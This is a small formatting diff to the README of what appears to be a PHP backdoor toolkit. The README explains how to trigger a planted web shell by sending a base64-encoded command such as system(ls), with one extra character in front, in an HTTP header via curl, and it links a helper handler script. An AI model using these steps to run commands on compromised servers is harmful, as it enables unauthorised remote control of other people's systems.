@@ -32,10 +32,10 @@ For example, the code below will execute the `ls` command:
 
 #### Usage
 This one a bit complex.\
-Lets say you want to run `system(ls)` so you will need to base64 encode it i.e. `c3lzdGVtKGxzKQ==`
-Now add any **1** character at the start of it. Let say 'x' so it will be `xc3lzdGVtKGxzKQ==`
-Now open your terminal and type the following command
-`curl -H 'x: xc3lzdGVtKGxzKQ==' http://example.com/backdoored.php`
+Lets say you want to run `system(ls)` so you will need to base64 encode it i.e. `c3lzdGVtKGxzKQ==`\
+Now add any **1** character at the start of it. Let say 'x' so it will be `xc3lzdGVtKGxzKQ==`\
+Now open your terminal and type the following command\
+`curl -H 'x: xc3lzdGVtKGxzKQ==' http://example.com/backdoored.php`\
 Too much work? You can use the [handler](https://github.com/UltimateHackers/nano/blob/master/handler.py) instead.
 
 ![handler](https://i.imgur.com/hkAHGwH.png)
